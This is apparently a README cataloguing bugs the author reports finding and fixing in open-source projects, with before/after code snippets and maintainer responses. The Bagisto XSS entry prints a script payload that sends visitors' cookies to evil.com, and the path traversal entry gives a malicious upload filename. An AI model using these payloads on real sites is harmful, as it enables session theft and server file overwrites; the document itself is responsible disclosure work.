<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0f0c29,50:302b63,100:24243e&height=160&section=header&text=OSS%20Analysis%20Findings&fontSize=36&fontColor=ffffff&fontAlignY=40&desc=Real%20bugs%20found%20in%20actively%20maintained%20open%20source%20projects&descAlignY=60&descColor=c0c0ff" width="100%"/>

</div>

<br/>

<div align="center">

[![Repos Analyzed](https://img.shields.io/badge/Repos%20Analyzed-14+-0f0c29?style=flat-square)](.)
[![Total Reported](https://img.shields.io/badge/Total%20Reported-14-302b63?style=flat-square)](.)
[![Confirmed Fixed](https://img.shields.io/badge/Confirmed%20Fixed-6-2ea44f?style=flat-square)](.)
[![PRs Open](https://img.shields.io/badge/PRs%20Open-3-f0a500?style=flat-square)](.)
[![Security Findings](https://img.shields.io/badge/Security%20Findings-1-e11d48?style=flat-square)](.)

</div>

---

## 📌 Methodology

Each finding comes from deep commit-level diff analysis — examining what changed between revisions, identifying callers that weren't updated, and verifying the behavioral contract break is real.

**What I look for:**
- Silent return value changes (`null` / empty instead of expected data)
- Exception scope widening (`except AttributeError` → `except Exception`)
- Parameter removals that break callers without a compile-time error
- Unreachable code masking intended behavior
- Wrong entity type passed to external APIs

---

## ✅ Confirmed & Fixed

### 1 · MoneyPrinterTurbo — Qwen empty `choices[]` crash
**Repo:** [harry0703/MoneyPrinterTurbo](https://github.com/harry0703/MoneyPrinterTurbo) · **22K+ ⭐**
**Issue:** [#984](https://github.com/harry0703/MoneyPrinterTurbo/issues/984) · **Fix PR:** [#994](https://github.com/harry0703/MoneyPrinterTurbo/pull/994) ✅ Merged · **Date:** Jun 4, 2026

When the Qwen API returns an empty `choices[]` array (rate-limit or quota exhausted), the code attempts `response.choices[0]` with no guard — raising an unhandled `IndexError` with zero diagnostic context. Users had no way to distinguish a quota issue from a code bug.

```python
# Before — crashes silently
content = response.choices[0].message.content

# After — clear diagnostic
if not response.choices:
    raise ValueError("Qwen returned empty choices — check API key / quota")
content = response.choices[0].message.content
```

**Response:** Maintainer acknowledged the diagnostics gap, requested a focused PR → merged same day. A community contributor also offered to help.

---

### 2 · MoneyPrinterTurbo — Groq model unvalidated on list-fetch failure
**Repo:** [harry0703/MoneyPrinterTurbo](https://github.com/harry0703/MoneyPrinterTurbo) · **22K+ ⭐**
**Issue:** [#1013](https://github.com/harry0703/MoneyPrinterTurbo/issues/1013) · **Fix PR:** [#1014](https://github.com/harry0703/MoneyPrinterTurbo/pull/1014) ✅ Merged · **Date:** Jun 10, 2026

When the Groq model list endpoint fails (network error, auth issue), the UI silently falls back to the first entry in a hardcoded list. If that entry is stale, every generation call uses the wrong model — no error, no warning.

**Response:** Maintainer agreed, requested PR → merged.

---

### 3 · MoneyPrinterTurbo — CLI `--video-source local` validation gaps
**Repo:** [harry0703/MoneyPrinterTurbo](https://github.com/harry0703/MoneyPrinterTurbo) · **22K+ ⭐**
**Issue:** [#1032](https://github.com/harry0703/MoneyPrinterTurbo/issues/1032) · **Fix PR:** [#1033](https://github.com/harry0703/MoneyPrinterTurbo/pull/1033) ✅ Merged · **Date:** Jun 13, 2026

The new `cli.py` accepted `--video-source local` without requiring `--video-materials`, causing failures deep into the run (after LLM + TTS steps) with a generic error. It also accepted `--stop-at terms` with local sources even though term generation is intentionally skipped for local sources — returning `{"terms": ""}` with no error.

Both constraints now checked in `parse_args()` via `parser.error()` — exits immediately with a clear message before any work begins.

**Response:** Maintainer verified locally with 3 test cases, merged. "Thanks for the contribution."

---

### 4 · MoneyPrinterTurbo — Credential leak in LLM error path (Security)
**Repo:** [harry0703/MoneyPrinterTurbo](https://github.com/harry0703/MoneyPrinterTurbo) · **22K+ ⭐**
**Issue:** [#1049](https://github.com/harry0703/MoneyPrinterTurbo/issues/1049) · **PR:** [#1050](https://github.com/harry0703/MoneyPrinterTurbo/pull/1050) 🔒 Confirmed — Fixed by maintainer · **Date:** Jun 17, 2026

When an LLM provider is configured with a custom `*_base_url` containing embedded credentials (`https://user:pass@host/v1`), the OpenAI SDK raises exceptions whose `str()` includes the raw URL. The bare `except Exception as e: return f"Error: {str(e)}"` block in `_generate_response` surfaced that string verbatim — leaking credentials into API responses and any logging layer that recorded return values.

```python
# Before — raw exception str leaks https://user:pass@host/v1
except Exception as e:
    return f"Error: {str(e)}"

# After — credentials redacted before surfacing
except Exception as e:
    return f"Error: {_sanitize_error_message(e)}"

def _sanitize_error_message(msg) -> str:
    return re.sub(r"(https?://)([^:@/\s]+:[^@/\s]+@)", r"\1***:***@", str(msg))
```

**Response:** Maintainer confirmed the finding was valid and had already independently fixed the same issue on `main` (commit `a810d67`). Their fix also covers sensitive query params (`api_key`, `access_token`, etc.) + added regression tests. PR #1050 closed as duplicate. Harry noted *"The report and PR helped confirm the right fix path."*

---

### 5 · CodeceptJS — `--shuffle` flag silently ignored after commit #5438
**Repo:** [codeceptjs/CodeceptJS](https://github.com/codeceptjs/CodeceptJS) · **10K+ ⭐**
**Issue:** [#5605](https://github.com/codeceptjs/CodeceptJS/issues/5605) · **Fix PR:** [#5639](https://github.com/codeceptjs/CodeceptJS/pull/5639) ✅ Merged · **Date:** Jun 5, 2026

Commit #5438 refactored test file loading and silently dropped the `shuffle()` call — the `--shuffle` CLI flag was accepted without error but had no effect. Tests always ran in the same order regardless of the flag, breaking randomized test ordering for all users.

```js
// Before fix — shuffle never called after #5438
this.testFiles = await this.loader.loadTests(opts);

// After fix — shuffle restored when flag is set
this.testFiles = await this.loader.loadTests(opts);
if (opts.shuffle) {
  this.testFiles = shuffle(this.testFiles);
}
```

**Response:** DavertMik (maintainer) merged PR #5639 and said "Thank you for catching it!"

---


---

### 6 · penpot — Stale MCP token shown after regeneration
**Repo:** [penpot/penpot](https://github.com/penpot/penpot) · **50K+ ⭐**
**Issue:** [#10279](https://github.com/penpot/penpot/issues/10279) · **Fix PR:** [#10280](https://github.com/penpot/penpot/pull/10280) ✅ Merged in v2.17.0 · **Date:** Jun 18, 2026

After the MCP state management refactor (PR #10226), the `on-created` callback in both `generate-mcp-token-modal` and `regenerate-mcp-token-modal` no longer called `fetch-access-tokens`. The call had been in `create-token*`'s `on-success` handler but was not carried forward to the new callbacks.

```clojure
;; profile.cljs — access-token-created was doing an optimistic conj:
(update state :access-tokens conj access-token)
;; ↑ leaves old (server-deleted) token as first match in the vector

;; create-access-token never triggered a re-fetch after the optimistic add.
;; d/seek in mcp-server-section* returns the FIRST mcp token → old stale data shown.
```

Result: after regenerating an MCP token, the Integrations page showed the old (now server-deleted) token's string, expiry, and server URL until the user manually refreshed the page. The bug was in `profile.cljs`, not in the UI components.

```clojure
;; Fix — remove optimistic conj, chain fetch-access-tokens after API call:
(->> (rp/cmd! :create-access-token params)
     (rx/tap on-success)
     (rx/mapcat (fn [token]
                  (rx/of (access-token-created token)
                         (fetch-access-tokens)))))  ;; ← ensures fresh state
```

**Response:** niwinz (core maintainer, original PR author) confirmed the bug, suggested this exact fix approach, and merged same day. Added to milestone v2.17.0.


## ⏳ Open / Pending


### 5 · medusajs/medusa — Race condition in `compensatePaymentIfNeededStep`
**Repo:** [medusajs/medusa](https://github.com/medusajs/medusa) · **28K+ ⭐**
**Discussion:** [#15550](https://github.com/medusajs/medusa/discussions/15550) ⏳ Watching · **Date:** Jun 4, 2026

Async workflow step `compensatePaymentIfNeededStep` has a potential race condition where concurrent order fulfillment flows could trigger duplicate payment compensation — leading to double refunds or inconsistent payment state.

---

### 6 · MoneyPrinterTurbo — `>=` comparison risk in duration check
**Repo:** [harry0703/MoneyPrinterTurbo](https://github.com/harry0703/MoneyPrinterTurbo) · **22K+ ⭐**
**Issue:** [#985](https://github.com/harry0703/MoneyPrinterTurbo/issues/985) ⏳ Community PR expected · **Date:** Jun 4, 2026

Duration boundary check uses `>=` where `>` is semantically correct — edge-case videos at exact boundary duration may be silently rejected or accepted incorrectly.

**Response:** Community contributor (Sushanth012) offered to submit a fix.

---

## 🔍 Recently Reported

### 7 · magento/magento2 — `NoSuchEntityException` race condition in `InvalidSkuProcessor` bulk price API
**Repo:** [magento/magento2](https://github.com/magento/magento2) · **14K+ ⭐**
**Issue:** [#40882](https://github.com/magento/magento2/issues/40882) · **PR:** [#40883](https://github.com/magento/magento2/pull/40883) 🔍 Open · **Date:** Jun 16, 2026

`retrieveInvalidSkuList()` calls `retrieveProductIdsBySkus()` to build a valid-SKU list, then calls `productRepository->get($sku)` on those SKUs without a try/catch. Between the two calls, a product can be deleted — causing `NoSuchEntityException` to propagate uncaught and fail the entire bulk price update batch, silently discarding all other valid entries.

```php
// Before — crashes entire batch if product deleted between lookup and fetch
if ($allowedPriceTypeValue && $type == Type::TYPE_BUNDLE) {
    $product = $this->productRepository->get($sku);  // ⚠️ throws if deleted
    ...
}

// After — graceful handling of race condition
try {
    $product = $this->productRepository->get($sku);
    if ($product->getPriceType() != $allowedPriceTypeValue) {
        $valueTypeIsAllowed = true;
    }
} catch (NoSuchEntityException $e) {
    $skuDiff[] = $sku;
    break;
}
```

The same pattern was fixed in `TierPriceValidator::checkQuantity()` (ACP2E-4998) but `InvalidSkuProcessor` was missed. Affects all bulk base-price, special-price, and tier-price APIs under concurrent catalog modifications.

---

### 8 · midjourney-api — `ChannelId` used as `ServerId` in Discord guild API
**Repo:** [erictik/midjourney-api](https://github.com/erictik/midjourney-api) · **1.8K ⭐**
**Issue:** [#294](https://github.com/erictik/midjourney-api/issues/294) 🔍 Open · **Date:** Jun 14, 2026

```typescript
// getCommand() and allCommand() — src/command.ts lines 68-72
let serverId = this.config.ServerId;
if (!serverId) {
  serverId = this.config.ChannelId;  // ⚠️ ChannelId ≠ guild ID
}
const url = `.../api/v9/guilds/${serverId}/application-command-index`;
```

`ServerId` is optional in config. When omitted, `ChannelId` is used as the guild ID — but Discord's endpoint requires a **server (guild) ID**. Channel IDs and guild IDs are different entity types in Discord's API. The call either returns 404 or wrong data, causing all command operations to fail.

---

### 9 · midjourney-api — Dead code in `cacheCommand()` — full cache never populated
**Repo:** [erictik/midjourney-api](https://github.com/erictik/midjourney-api) · **1.8K ⭐**
**Issue:** [#295](https://github.com/erictik/midjourney-api/issues/295) 🔍 Open · **Date:** Jun 14, 2026

```typescript
// src/command.ts lines 35-45
async cacheCommand(name: CommandName) {
  if (this.cache[name] !== undefined) return this.cache[name];
  const command = await this.getCommand(name);
  this.cache[name] = command;
  return command;        // ← exits here

  this.allCommand();     // ← dead code: never reached
  return this.cache[name]; // ← dead code: never reached
}
```

`allCommand()` was meant to bulk-fetch all commands on first miss, populating the full cache. The early `return` makes it unreachable — every subsequent `cacheCommand()` call hits Discord's API individually, causing unnecessary requests and potential rate limiting.

---

### 10 · bagisto — `getClientOriginalName()` path traversal in `RMAImageRepository` — incomplete security fix
**Repo:** [bagisto/bagisto](https://github.com/bagisto/bagisto) · **9.1K+ ⭐**
**Issue:** [#11338](https://github.com/bagisto/bagisto/issues/11338) 🔍 Open · **Date:** Jun 14, 2026

A prior security fix correctly replaced `getClientOriginalName()` in `RequestController.php`, but `RMAImageRepository.php` was missed — it still uses the client-supplied filename directly as the storage path:

```php
// RMAImageRepository.php — manageImages() lines 25-28
foreach ($requestImages as $itemImage) {
    $this->create([
        'rma_id' => $rma->id,
        'path' => $itemImage->getClientOriginalName(),  // ⚠️ attacker-controlled
    ]);
}
```

An attacker can upload a file named `../../../../config/database.php` — the client-provided name is stored as the path without sanitization, enabling path traversal to overwrite arbitrary files on the server.

**Fix:** Replace `getClientOriginalName()` with `store()` to generate a safe, random server-side path — matching the pattern already applied to `RequestController.php`.

---

### 11 · bagisto — `v-html` XSS in Shop views — `product_name` + datagrid columns unescaped
**Repo:** [bagisto/bagisto](https://github.com/bagisto/bagisto) · **9.1K+ ⭐**
**Issue:** [#11339](https://github.com/bagisto/bagisto/issues/11339) 🔍 Open · **Date:** Jun 14, 2026

Multiple Shop views render user-controlled data via Vue's `v-html`, which bypasses HTML escaping — allowing stored XSS. A prior fix addressed `customer_name`, but `product_name` and datagrid `record[column.index]` remain unpatched.

```html
<!-- order-view.blade.php -->
<p v-html="item.name"></p>  <!-- ⚠️ product name from DB — unescaped -->

<!-- datagrid/table.blade.php -->
<span v-html="record[column.index]"></span>  <!-- ⚠️ any column value — unescaped -->
```

A seller or admin with product-edit access can inject `<script>document.location='https://evil.com?c='+document.cookie</script>` as a product name. Every customer who views their order detail page executes the payload.

**Fix:** Replace `v-html` with `{{ }}` interpolation (Vue's safe default) for all user-controlled string fields, matching the fix already applied to `customer_name`.

---

## 📊 Analysis Log

| Date | Repo | Commits Analyzed | Outcome |
|:-----|:-----|:----------------:|:--------|
| Jun 18 | penpot/penpot | MCP token state refactor | MCP token stale state → issue #10279 → PR #10280 merged in v2.17.0 ✅ |
| Jun 17 | harry0703/MoneyPrinterTurbo | llm.py error path | 🔒 Credential leak → issue #1049 → fix confirmed on main (a810d67) |
| Jun 16 | magento/magento2 | ACP2E-4998 adjacent | NoSuchEntityException race → issue #40882 → PR #40883 |
| Jun 14 | bagisto/bagisto | 2 | 2 security bugs → issues #11338 (path traversal) #11339 (XSS) |
| Jun 14 | apify/crawlee-python | 3 | Behavioral findings — silent URL filtering, exception propagation change |
| Jun 14 | tox-dev/tox | 1 | Config override namespace risk identified |
| Jun 14 | gptme/gptme | 1 | LLM routing refactor — HIGH risk noted |
| Jun 14 | erictik/midjourney-api | 1 | 2 confirmed bugs → issues #294 #295 opened |
| Jun 13 | harry0703/MoneyPrinterTurbo | cli.py | Issue #1032 → PR #1033 merged ✅ |
| Jun 10 | harry0703/MoneyPrinterTurbo | groq fix | Issue #1013 → PR #1014 merged ✅ |
| Jun 5 | codeceptjs/CodeceptJS | commit #5438 | shuffle regression → issue #5605 → PR #5639 merged ✅ |
| Jun 4 | medusajs/medusa | payment step | Discussion #15550 |
| Jun 4 | harry0703/MoneyPrinterTurbo | qwen fix | Issue #984 → PR #994 merged ✅ |

---

<div align="center">

*Commit-level diff analysis · Cross-module caller tracking · Behavioral contract verification*

<br/>

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:24243e,50:302b63,100:0f0c29&height=100&section=footer" width="100%"/>

</div>
